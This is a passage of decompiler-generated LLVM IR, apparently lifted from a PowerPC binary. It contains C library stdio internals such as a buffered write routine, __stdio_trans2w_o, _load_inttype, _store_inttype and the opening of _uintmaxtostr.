  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_100077a8 = load i16, i16* %arg3, align 2
  %v1_100077ac = and i16 %v3_100077a8, 512
  %v3_100077ac = icmp eq i16 %v1_100077ac, 0
  br i1 %v3_100077ac, label %dec_label_pc_100077b4, label %dec_label_pc_100078c0

dec_label_pc_100077b4:                            ; preds = %entry
  %v2_100077b4 = add i32 %tmp, 4
  %v3_100077b4 = inttoptr i32 %v2_100077b4 to i32*
  %v4_100077b4 = load i32, i32* %v3_100077b4, align 4
  %v2_100077b8 = add i32 %tmp, 16
  %v3_100077b8 = inttoptr i32 %v2_100077b8 to i32*
  %v4_100077b8 = load i32, i32* %v3_100077b8, align 4
  store i32 %v4_100077b8, i32* @r3, align 4
  %v2_100077bc = add i32 %tmp, 12
  %v3_100077bc = inttoptr i32 %v2_100077bc to i32*
  %v4_100077bc = load i32, i32* %v3_100077bc, align 4
  %v3_100077c0 = icmp eq i32 %v4_100077b4, -2
  %v2_100077c8 = sub i32 %v4_100077bc, %v4_100077b8
  br i1 %v3_100077c0, label %dec_label_pc_100077c8, label %dec_label_pc_100077f8

dec_label_pc_100077c8:                            ; preds = %dec_label_pc_100077b4
  %v3_100077d0 = icmp ult i32 %v2_100077c8, %arg2
  br i1 %v3_100077d0, label %dec_label_pc_100077d8, label %dec_label_pc_100077dc

dec_label_pc_100077d8:                            ; preds = %dec_label_pc_100077c8
  br label %dec_label_pc_100077dc

dec_label_pc_100077dc:                            ; preds = %dec_label_pc_100077c8, %dec_label_pc_100077d8
  %storemerge = phi i32 [ %v2_100077c8, %dec_label_pc_100077d8 ], [ %arg2, %dec_label_pc_100077c8 ]
  %v0_100077e0 = phi i32 [ %v2_100077c8, %dec_label_pc_100077d8 ], [ %arg2, %dec_label_pc_100077c8 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_100077e0, i32* @r5, align 4
  store i32 268466152, i32* @lr, align 4
  %v0_100077e4 = call i32 @memcpy()
  %v0_100077e8 = load i32, i32* @r30, align 4
  %v1_100077e8 = add i32 %v0_100077e8, 16
  %v2_100077e8 = inttoptr i32 %v1_100077e8 to i32*
  %v3_100077e8 = load i32, i32* %v2_100077e8, align 4
  %v1_100077ec = load i32, i32* @r31, align 4
  %v2_100077ec = add i32 %v1_100077ec, %v3_100077e8
  store i32 %v2_100077ec, i32* %v2_100077e8, align 4
  br label %dec_label_pc_100078e0

dec_label_pc_100077f8:                            ; preds = %dec_label_pc_100077b4
  %v3_100077fc = icmp ult i32 %v2_100077c8, %arg2
  br i1 %v3_100077fc, label %dec_label_pc_1000789c, label %dec_label_pc_10007804

dec_label_pc_10007804:                            ; preds = %dec_label_pc_100077f8
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268466192, i32* @lr, align 4
  %v0_1000780c = call i32 @memcpy()
  %v0_10007810 = load i32, i32* @r30, align 4
  %v1_10007810 = inttoptr i32 %v0_10007810 to i16*
  %v2_10007810 = load i16, i16* %v1_10007810, align 2
  %v1_10007814 = add i32 %v0_10007810, 16
  %v2_10007814 = inttoptr i32 %v1_10007814 to i32*
  %v3_10007814 = load i32, i32* %v2_10007814, align 4
  %v1_10007818 = and i16 %v2_10007810, 256
  %v3_10007818 = icmp eq i16 %v1_10007818, 0
  %v1_1000781c = load i32, i32* @r29, align 4
  %v2_1000781c = add i32 %v1_1000781c, %v3_10007814
  store i32 %v2_1000781c, i32* %v2_10007814, align 4
  br i1 %v3_10007818, label %dec_label_pc_100078e0, label %dec_label_pc_10007828

dec_label_pc_10007828:                            ; preds = %dec_label_pc_10007804
  %v0_10007828 = load i32, i32* @r28, align 4
  %v0_10007830 = load i32, i32* @r29, align 4
  store i32 268466232, i32* @lr, align 4
  %v4_10007834 = call i32 @memrchr(i32 %v0_10007828, i32 10, i32 %v0_10007830, i32 %v2_1000781c)
  %v3_10007838 = icmp eq i32 %v4_10007834, 0
  br i1 %v3_10007838, label %dec_label_pc_100078e0, label %dec_label_pc_10007840

dec_label_pc_10007840:                            ; preds = %dec_label_pc_10007828
  %v0_10007840 = load i32, i32* @r30, align 4
  store i32 %v0_10007840, i32* @r3, align 4
  store i32 268466248, i32* @lr, align 4
  %v0_10007844 = call i32 @__stdio_wcommit()
  %v3_10007848 = icmp eq i32 %v0_10007844, 0
  br i1 %v3_10007848, label %dec_label_pc_100078e0, label %dec_label_pc_10007850

dec_label_pc_10007850:                            ; preds = %dec_label_pc_10007840
  %v0_10007850 = load i32, i32* @r29, align 4
  %v3_10007850 = icmp ugt i32 %v0_10007850, %v0_10007844
  %v0_10007844.v0_10007854 = select i1 %v3_10007850, i32 %v0_10007844, i32 %v0_10007850
  store i32 %v0_10007844.v0_10007854, i32* @r31, align 4
  %v2_10007860 = sub i32 %v0_10007850, %v0_10007844.v0_10007854
  %v0_10007868 = load i32, i32* @r28, align 4
  %v2_10007868 = add i32 %v0_10007868, %v2_10007860
  store i32 %v2_10007868, i32* @r28, align 4
  store i32 %v2_10007868, i32* @r3, align 4
  store i32 268466296, i32* @lr, align 4
  %v3_10007874 = call i32 @__GI_memchr(i32 %v2_10007868, i32 10, i32 %v0_10007844.v0_10007854)
  %v3_10007878 = icmp eq i32 %v3_10007874, 0
  br i1 %v3_10007878, label %dec_label_pc_100078e0, label %dec_label_pc_10007880

dec_label_pc_10007880:                            ; preds = %dec_label_pc_10007850
  %v0_10007880 = load i32, i32* @r30, align 4
  %v1_10007880 = add i32 %v0_10007880, 16
  %v2_10007880 = inttoptr i32 %v1_10007880 to i32*
  %v3_10007880 = load i32, i32* %v2_10007880, align 4
  %v0_10007884 = load i32, i32* @r28, align 4
  %v1_10007884 = load i32, i32* @r31, align 4
  %v2_10007884 = sub i32 %v0_10007884, %v3_10007874
  %v2_10007888 = add i32 %v2_10007884, %v1_10007884
  %v1_1000788c = load i32, i32* @r29, align 4
  %v2_1000788c = sub i32 %v1_1000788c, %v2_10007888
  store i32 %v2_1000788c, i32* @r29, align 4
  %v2_10007890 = sub i32 %v3_10007880, %v2_10007888
  store i32 %v2_10007890, i32* %v2_10007880, align 4
  br label %dec_label_pc_100078e0

dec_label_pc_1000789c:                            ; preds = %dec_label_pc_100077f8
  %v2_1000789c = add i32 %tmp, 8
  %v3_1000789c = inttoptr i32 %v2_1000789c to i32*
  %v4_1000789c = load i32, i32* %v3_1000789c, align 4
  %v4_100078a0 = icmp eq i32 %v4_100077b8, %v4_1000789c
  br i1 %v4_100078a0, label %dec_label_pc_100078c0, label %dec_label_pc_100078a8

dec_label_pc_100078a8:                            ; preds = %dec_label_pc_1000789c
  store i32 %tmp, i32* @r3, align 4
  store i32 268466352, i32* @lr, align 4
  %v0_100078ac = call i32 @__stdio_wcommit()
  %v3_100078b0 = icmp eq i32 %v0_100078ac, 0
  br i1 %v3_100078b0, label %dec_label_pc_100078a8.dec_label_pc_100078c0_crit_edge, label %dec_label_pc_100078b8

dec_label_pc_100078a8.dec_label_pc_100078c0_crit_edge: ; preds = %dec_label_pc_100078a8
  %v0_100078c4.pre = load i32, i32* @r30, align 4
  %v0_100078c8.pre = load i32, i32* @r28, align 4
  %v0_100078cc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100078c0

dec_label_pc_100078b8:                            ; preds = %dec_label_pc_100078a8
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_100078e0

dec_label_pc_100078c0:                            ; preds = %dec_label_pc_100078a8.dec_label_pc_100078c0_crit_edge, %entry, %dec_label_pc_1000789c
  %v0_100078cc = phi i32 [ %v0_100078cc.pre, %dec_label_pc_100078a8.dec_label_pc_100078c0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1000789c ]
  %v0_100078c8 = phi i32 [ %v0_100078c8.pre, %dec_label_pc_100078a8.dec_label_pc_100078c0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1000789c ]
  %v0_100078c4 = phi i32 [ %v0_100078c4.pre, %dec_label_pc_100078a8.dec_label_pc_100078c0_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1000789c ]
  %v1_100078c4 = inttoptr i32 %v0_100078c4 to i16*
  store i32 %v0_100078cc, i32* @r5, align 4
  store i32 %v0_10007790, i32* @lr, align 4
  %v5_100078dc = call i32 @__stdio_WRITE(i16* %v1_100078c4, i32 %v0_100078c8)
  br label %dec_label_pc_100078e0

dec_label_pc_100078e0:                            ; preds = %dec_label_pc_10007850, %dec_label_pc_10007840, %dec_label_pc_10007828, %dec_label_pc_10007804, %dec_label_pc_100078b8, %dec_label_pc_10007880, %dec_label_pc_100077dc, %dec_label_pc_100078c0
  %v0_100078e4 = load i32, i32* @r29, align 4
  ret i32 %v0_100078e4

; uselistorder directives
  uselistorder i32 %v2_10007888, { 1, 0 }
  uselistorder i32 %v0_10007844.v0_10007854, { 0, 2, 1 }
  uselistorder i32 %v0_10007850, { 1, 0, 2 }
  uselistorder i32 %v2_100077c8, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_100078e0, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_100078c0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100077dc, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100078fc = load i32, i32* @lr, align 4
  store i32 %v0_100078fc, i32* %r0.global-to-local, align 4
  %v0_10007900 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000790c = load i16, i16* %arg1, align 2
  %v4_1000790c = zext i16 %v3_1000790c to i32
  store i32 %v4_1000790c, i32* %r0.global-to-local, align 4
  %v2_10007910 = and i32 %v4_1000790c, %arg2
  store i32 %v2_10007910, i32* %r9.global-to-local, align 4
  %v5_10007910 = icmp eq i32 %v2_10007910, 0
  br i1 %v5_10007910, label %dec_label_pc_10007918, label %dec_label_pc_10007928

dec_label_pc_10007918:                            ; preds = %entry
  %v1_10007918 = and i32 %v4_1000790c, 2176
  store i32 %v1_10007918, i32* %r9.global-to-local, align 4
  %v3_10007918 = icmp eq i32 %v1_10007918, 0
  br i1 %v3_10007918, label %dec_label_pc_10007920, label %dec_label_pc_10007934

dec_label_pc_10007920:                            ; preds = %dec_label_pc_10007918
  %v2_10007920 = or i32 %v4_1000790c, %arg2
  store i32 %v2_10007920, i32* %r0.global-to-local, align 4
  %v1_10007924 = trunc i32 %v2_10007920 to i16
  store i16 %v1_10007924, i16* %arg1, align 2
  %v0_10007928.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007928

dec_label_pc_10007928:                            ; preds = %entry, %dec_label_pc_10007920
  %v0_10007964 = phi i32 [ %tmp, %entry ], [ %v0_10007928.pre, %dec_label_pc_10007920 ]
  %v1_10007928 = inttoptr i32 %v0_10007964 to i16*
  %v2_10007928 = load i16, i16* %v1_10007928, align 2
  %v3_10007928 = zext i16 %v2_10007928 to i32
  %v1_1000792c = and i32 %v3_10007928, 32
  store i32 %v1_1000792c, i32* %r0.global-to-local, align 4
  %v3_1000792c = icmp eq i32 %v1_1000792c, 0
  br i1 %v3_1000792c, label %dec_label_pc_10007954, label %dec_label_pc_10007934

dec_label_pc_10007934:                            ; preds = %dec_label_pc_10007918, %dec_label_pc_10007928
  %v0_10007934 = call i32 @__errno_location()
  store i32 %v0_10007934, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_1000793c = inttoptr i32 %v0_10007934 to i32*
  store i32 9, i32* %v2_1000793c, align 4
  br label %dec_label_pc_10007940

dec_label_pc_10007940:                            ; preds = %dec_label_pc_1000797c, %dec_label_pc_10007934
  %v0_10007940 = load i32, i32* @r31, align 4
  %v1_10007940 = inttoptr i32 %v0_10007940 to i16*
  %v2_10007940 = load i16, i16* %v1_10007940, align 2
  %v3_10007940 = zext i16 %v2_10007940 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10007948 = or i32 %v3_10007940, 8
  store i32 %v1_10007948, i32* %r0.global-to-local, align 4
  %v1_1000794c = trunc i32 %v1_10007948 to i16
  store i16 %v1_1000794c, i16* %v1_10007940, align 2
  br label %dec_label_pc_100079dc

dec_label_pc_10007954:                            ; preds = %dec_label_pc_10007928
  %tmp8 = urem i16 %v2_10007928, 4
  %v1_10007954 = zext i16 %tmp8 to i32
  store i32 %v1_10007954, i32* %r0.global-to-local, align 4
  %v3_10007954 = icmp eq i16 %tmp8, 0
  br i1 %v3_10007954, label %dec_label_pc_100079b8, label %dec_label_pc_1000795c

dec_label_pc_1000795c:                            ; preds = %dec_label_pc_10007954
  %v1_1000795c = and i32 %v3_10007928, 4
  store i32 %v1_1000795c, i32* %r9.global-to-local, align 4
  %v3_1000795c = icmp eq i32 %v1_1000795c, 0
  br i1 %v3_1000795c, label %dec_label_pc_10007964, label %dec_label_pc_1000799c

dec_label_pc_10007964:                            ; preds = %dec_label_pc_1000795c
  %v1_10007964 = add i32 %v0_10007964, 20
  %v2_10007964 = inttoptr i32 %v1_10007964 to i32*
  %v3_10007964 = load i32, i32* %v2_10007964, align 4
  store i32 %v3_10007964, i32* %r0.global-to-local, align 4
  %v1_10007968 = add i32 %v0_10007964, 16
  %v2_10007968 = inttoptr i32 %v1_10007968 to i32*
  %v3_10007968 = load i32, i32* %v2_10007968, align 4
  store i32 %v3_10007968, i32* %r9.global-to-local, align 4
  %v4_1000796c = icmp eq i32 %v3_10007964, %v3_10007968
  br i1 %v4_1000796c, label %dec_label_pc_10007974, label %dec_label_pc_1000797c

dec_label_pc_10007974:                            ; preds = %dec_label_pc_10007964
  %v1_10007974 = and i32 %v3_10007928, 2
  store i32 %v1_10007974, i32* %r0.global-to-local, align 4
  %v3_10007974 = icmp eq i32 %v1_10007974, 0
  br i1 %v3_10007974, label %dec_label_pc_1000799c, label %dec_label_pc_1000797c

dec_label_pc_1000797c:                            ; preds = %dec_label_pc_10007964, %dec_label_pc_10007974
  %v1_1000797c = and i32 %v3_10007928, 1024
  store i32 %v1_1000797c, i32* %r9.global-to-local, align 4
  %v0_10007984 = call i32 @__asm_mfcr()
  store i32 %v0_10007984, i32* %r3.global-to-local, align 4
  %v1_10007988 = call i32 @__asm_rlwinm(i32 %v0_10007984, i32 3, i32 31, i32 31)
  %v1_1000798c = sub i32 2, %v1_10007988
  store i32 %v1_1000798c, i32* @r5, align 4
  store i32 268466580, i32* @lr, align 4
  %v1_10007990 = call i32 @__GI_fseek(i32 %v1_1000798c)
  store i32 %v1_10007990, i32* %r3.global-to-local, align 4
  %v3_10007994 = icmp eq i32 %v1_10007990, 0
  br i1 %v3_10007994, label %dec_label_pc_1000797c.dec_label_pc_1000799c_crit_edge, label %dec_label_pc_10007940

dec_label_pc_1000797c.dec_label_pc_1000799c_crit_edge: ; preds = %dec_label_pc_1000797c
  %v0_1000799c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000799c

dec_label_pc_1000799c:                            ; preds = %dec_label_pc_1000797c.dec_label_pc_1000799c_crit_edge, %dec_label_pc_1000795c, %dec_label_pc_10007974
  %v0_1000799c = phi i32 [ %v0_1000799c.pre, %dec_label_pc_1000797c.dec_label_pc_1000799c_crit_edge ], [ %v0_10007964, %dec_label_pc_1000795c ], [ %v0_10007964, %dec_label_pc_10007974 ]
  %v1_1000799c = inttoptr i32 %v0_1000799c to i16*
  %v2_1000799c = load i16, i16* %v1_1000799c, align 2
  %v3_1000799c = zext i16 %v2_1000799c to i32
  store i32 %v3_1000799c, i32* %r0.global-to-local, align 4
  %v1_100079a0 = add i32 %v0_1000799c, 8
  %v2_100079a0 = inttoptr i32 %v1_100079a0 to i32*
  %v3_100079a0 = load i32, i32* %v2_100079a0, align 4
  store i32 %v3_100079a0, i32* %r9.global-to-local, align 4
  %v1_100079a4 = call i32 @__asm_rlwinm(i32 %v3_1000799c, i32 0, i32 0, i32 29)
  %v2_100079a4 = trunc i32 %v1_100079a4 to i16
  store i32 %v1_100079a4, i32* %r0.global-to-local, align 4
  %v3_100079a8 = load i32, i32* @r31, align 4
  %v4_100079a8 = inttoptr i32 %v3_100079a8 to i16*
  store i16 %v2_100079a4, i16* %v4_100079a8, align 2
  %v0_100079ac = load i32, i32* %r9.global-to-local, align 4
  %v1_100079ac = load i32, i32* @r31, align 4
  %v2_100079ac = add i32 %v1_100079ac, 20
  %v3_100079ac = inttoptr i32 %v2_100079ac to i32*
  store i32 %v0_100079ac, i32* %v3_100079ac, align 4
  %v0_100079b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100079b0 = load i32, i32* @r31, align 4
  %v2_100079b0 = add i32 %v1_100079b0, 24
  %v3_100079b0 = inttoptr i32 %v2_100079b0 to i32*
  store i32 %v0_100079b0, i32* %v3_100079b0, align 4
  %v0_100079b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100079b4 = load i32, i32* @r31, align 4
  %v2_100079b4 = add i32 %v1_100079b4, 16
  %v3_100079b4 = inttoptr i32 %v2_100079b4 to i32*
  store i32 %v0_100079b4, i32* %v3_100079b4, align 4
  %v0_100079b8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100079b8

dec_label_pc_100079b8:                            ; preds = %dec_label_pc_10007954, %dec_label_pc_1000799c
  %v2_100079c4 = phi i32 [ %v0_10007964, %dec_label_pc_10007954 ], [ %v0_100079b8.pre, %dec_label_pc_1000799c ]
  %v1_100079b8 = inttoptr i32 %v2_100079c4 to i16*
  %v2_100079b8 = load i16, i16* %v1_100079b8, align 2
  %v3_100079b8 = zext i16 %v2_100079b8 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100079c0 = or i32 %v3_100079b8, 64
  store i32 %v1_100079c0, i32* %r0.global-to-local, align 4
  %v1_100079c4 = trunc i32 %v1_100079c0 to i16
  store i16 %v1_100079c4, i16* %v1_100079b8, align 2
  %v0_100079c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100079c8 = urem i32 %v0_100079c8, 65536
  store i32 %v1_100079c8, i32* %r0.global-to-local, align 4
  %v1_100079cc = and i32 %v0_100079c8, 2816
  store i32 %v1_100079cc, i32* %r9.global-to-local, align 4
  %v3_100079cc = icmp eq i32 %v1_100079cc, 0
  br i1 %v3_100079cc, label %dec_label_pc_100079d4, label %dec_label_pc_100079dc

dec_label_pc_100079d4:                            ; preds = %dec_label_pc_100079b8
  %v0_100079d4 = load i32, i32* @r31, align 4
  %v1_100079d4 = add i32 %v0_100079d4, 12
  %v2_100079d4 = inttoptr i32 %v1_100079d4 to i32*
  %v3_100079d4 = load i32, i32* %v2_100079d4, align 4
  store i32 %v3_100079d4, i32* %r0.global-to-local, align 4
  %v2_100079d8 = add i32 %v0_100079d4, 28
  %v3_100079d8 = inttoptr i32 %v2_100079d8 to i32*
  store i32 %v3_100079d4, i32* %v3_100079d8, align 4
  br label %dec_label_pc_100079dc

dec_label_pc_100079dc:                            ; preds = %dec_label_pc_100079b8, %dec_label_pc_10007940, %dec_label_pc_100079d4
  store i32 %v0_100078fc, i32* %r0.global-to-local, align 4
  store i32 %v0_10007900, i32* @r31, align 4
  %v0_100079ec = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100079ec

; uselistorder directives
  uselistorder i32 %v0_100079c8, { 1, 0 }
  uselistorder i32 %v1_100079a4, { 1, 0 }
  uselistorder i32 %v0_1000799c, { 1, 0 }
  uselistorder i32 %v0_10007964, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_1000790c, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 0, 5, 6, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 7, 8, 9, 6, 0, 1, 2, 4, 5, 3 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100079dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100079b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000799c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000797c, { 1, 0 }
  uselistorder label %dec_label_pc_10007934, { 1, 0 }
  uselistorder label %dec_label_pc_10007928, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_100079f0 = load i32, i32* @r5, align 4
  %v1_100079f0 = icmp slt i32 %v0_100079f0, 0
  %v1_100079f4 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10007a30 = icmp eq i32 %v1_100079f4, 0
  br i1 %v1_100079f0, label %dec_label_pc_10007a30, label %dec_label_pc_100079fc

dec_label_pc_100079fc:                            ; preds = %entry
  br i1 %v3_10007a30, label %dec_label_pc_10007a04, label %dec_label_pc_10007a38

dec_label_pc_10007a04:                            ; preds = %dec_label_pc_100079fc
  %v3_10007a04 = icmp eq i32 %arg1, 256
  br i1 %v3_10007a04, label %dec_label_pc_10007a10, label %dec_label_pc_10007a18

dec_label_pc_10007a10:                            ; preds = %dec_label_pc_10007a04
  br label %dec_label_pc_10007a24

dec_label_pc_10007a18:                            ; preds = %dec_label_pc_10007a04
  %v3_10007a18 = icmp eq i32 %arg1, 512
  br i1 %v3_10007a18, label %dec_label_pc_10007a20, label %dec_label_pc_10007a24

dec_label_pc_10007a20:                            ; preds = %dec_label_pc_10007a18
  br label %dec_label_pc_10007a24

dec_label_pc_10007a24:                            ; preds = %dec_label_pc_10007a18, %dec_label_pc_10007a10, %dec_label_pc_10007a20
  ret i32 0

dec_label_pc_10007a30:                            ; preds = %entry
  br i1 %v3_10007a30, label %dec_label_pc_10007a44, label %dec_label_pc_10007a38

dec_label_pc_10007a38:                            ; preds = %dec_label_pc_100079fc, %dec_label_pc_10007a30
  %v2_10007a38 = load i32, i32* %arg2, align 4
  ret i32 %v2_10007a38

dec_label_pc_10007a44:                            ; preds = %dec_label_pc_10007a30
  %v3_10007a44 = icmp eq i32 %arg1, 256
  %v2_10007a48 = load i32, i32* %arg2, align 4
  br i1 %v3_10007a44, label %dec_label_pc_10007a50, label %dec_label_pc_10007a58

dec_label_pc_10007a50:                            ; preds = %dec_label_pc_10007a44
  %v1_10007a50 = urem i32 %v2_10007a48, 256
  br label %dec_label_pc_10007a64

dec_label_pc_10007a58:                            ; preds = %dec_label_pc_10007a44
  %v3_10007a58 = icmp eq i32 %arg1, 512
  br i1 %v3_10007a58, label %dec_label_pc_10007a60, label %dec_label_pc_10007a64

dec_label_pc_10007a60:                            ; preds = %dec_label_pc_10007a58
  %v1_10007a60 = mul i32 %v2_10007a48, 65536
  %v2_10007a60 = sdiv i32 %v1_10007a60, 65536
  br label %dec_label_pc_10007a64

dec_label_pc_10007a64:                            ; preds = %dec_label_pc_10007a58, %dec_label_pc_10007a50, %dec_label_pc_10007a60
  %v0_10007a64 = phi i32 [ %v2_10007a48, %dec_label_pc_10007a58 ], [ %v1_10007a50, %dec_label_pc_10007a50 ], [ %v2_10007a60, %dec_label_pc_10007a60 ]
  %tmp = icmp slt i32 %v0_10007a64, 0
  %v1_10007a68 = zext i1 %tmp to i32
  %v2_10007a68 = ashr i32 %v0_10007a64, 31
  %v3_10007a68 = and i32 %v2_10007a68, -2
  %v4_10007a68 = or i32 %v3_10007a68, %v1_10007a68
  ret i32 %v4_10007a68

; uselistorder directives
  uselistorder i32 %v0_10007a64, { 1, 0 }
  uselistorder i32 %v2_10007a48, { 2, 0, 1 }
  uselistorder i1 %v3_10007a30, { 1, 0 }
  uselistorder i32 %arg1, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_10007a64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007a38, { 1, 0 }
  uselistorder label %dec_label_pc_10007a24, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10007a70 = load i32, i32* @r4, align 4
  %v3_10007a70 = icmp eq i32 %v0_10007a70, 256
  br i1 %v3_10007a70, label %dec_label_pc_10007a7c, label %dec_label_pc_10007a84

dec_label_pc_10007a7c:                            ; preds = %entry
  %v0_10007a7c = load i32, i32* @r6, align 4
  %v1_10007a7c = trunc i32 %v0_10007a7c to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10007a7c, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10007a84:                            ; preds = %entry
  %v3_10007a74 = icmp eq i32 %v0_10007a70, 2048
  br i1 %v3_10007a74, label %dec_label_pc_10007a8c, label %dec_label_pc_10007a98

dec_label_pc_10007a8c:                            ; preds = %dec_label_pc_10007a84
  %v0_10007a8c = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10007a8c, i32* %tmp2, align 4
  %v0_10007a90 = load i32, i32* @r6, align 4
  %v3_10007a90 = add i32 %tmp, 4
  %v4_10007a90 = inttoptr i32 %v3_10007a90 to i32*
  store i32 %v0_10007a90, i32* %v4_10007a90, align 4
  ret i32 %tmp

dec_label_pc_10007a98:                            ; preds = %dec_label_pc_10007a84
  %v3_10007a84 = icmp eq i32 %v0_10007a70, 512
  %v0_10007a9c = load i32, i32* @r6, align 4
  br i1 %v3_10007a84, label %dec_label_pc_10007a9c, label %dec_label_pc_10007aa4

dec_label_pc_10007a9c:                            ; preds = %dec_label_pc_10007a98
  %v1_10007a9c = trunc i32 %v0_10007a9c to i16
  store i16 %v1_10007a9c, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10007aa4:                            ; preds = %dec_label_pc_10007a98
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10007a9c, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 2, 3, 1, 0, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10007ab0 = load i32, i32* @r7, align 4
  %v3_10007ab0 = icmp eq i32 %v0_10007ab0, 0
  store i1 %v3_10007ab0, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* %r30.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_10007ab0, -1
  br i1 %tmp13, label %dec_label_pc_10007ae0, label %dec_label_pc_10007ac0

dec_label_pc_10007ac0:                            ; preds = %entry
  %v0_10007ac0 = load i32, i32* %r5.global-to-local, align 4
  %v1_10007ac4 = sub i32 0, %v0_10007ab0
  store i32 %v1_10007ac4, i32* @r7, align 4
  %tmp14 = icmp sgt i32 %v0_10007ac0, -1
  br i1 %tmp14, label %dec_label_pc_10007ae0, label %dec_label_pc_10007acc

dec_label_pc_10007acc:                            ; preds = %dec_label_pc_10007ac0
  %v0_10007acc = load i32, i32* %r6.global-to-local, align 4
  %v1_10007acc = sub i32 0, %v0_10007acc
  %v2_10007acc = sub i32 -1, %v0_10007acc
  store i32 %v1_10007acc, i32* %r6.global-to-local, align 4
  %v4_10007acc = icmp uge i32 %v2_10007acc, %v1_10007acc
  %v1_10007ad0 = sub i32 -1, %v0_10007ac0
  %v3_10007ad0 = zext i1 %v4_10007acc to i32
  %v4_10007ad0 = add i32 %v3_10007ad0, %v1_10007ad0
  store i32 %v4_10007ad0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007ae0

dec_label_pc_10007ae0:                            ; preds = %entry, %dec_label_pc_10007ac0, %dec_label_pc_10007acc
  %v1_10007ae4 = phi i32 [ %v1_10007ac4, %dec_label_pc_10007acc ], [ %v1_10007ac4, %dec_label_pc_10007ac0 ], [ %v0_10007ab0, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10007acc ], [ 0, %dec_label_pc_10007ac0 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10007ae4 = udiv i32 -1, %v1_10007ae4
  store i32 %v2_10007ae4, i32* %r8.global-to-local, align 4
  %v2_10007aec = load i32, i32* %r3.global-to-local, align 4
  %v3_10007aec = inttoptr i32 %v2_10007aec to i8*
  store i8 0, i8* %v3_10007aec, align 1
  %v0_10007af0 = load i32, i32* %r8.global-to-local, align 4
  %v1_10007af0 = load i32, i32* @r7, align 4
  %v2_10007af0 = mul i32 %v1_10007af0, %v0_10007af0
  %v1_10007af4 = sub i32 0, %v2_10007af0
  store i32 %v1_10007af4, i32* %r31.global-to-local, align 4
  %v4_10007af8 = icmp eq i32 %v1_10007af0, %v1_10007af4
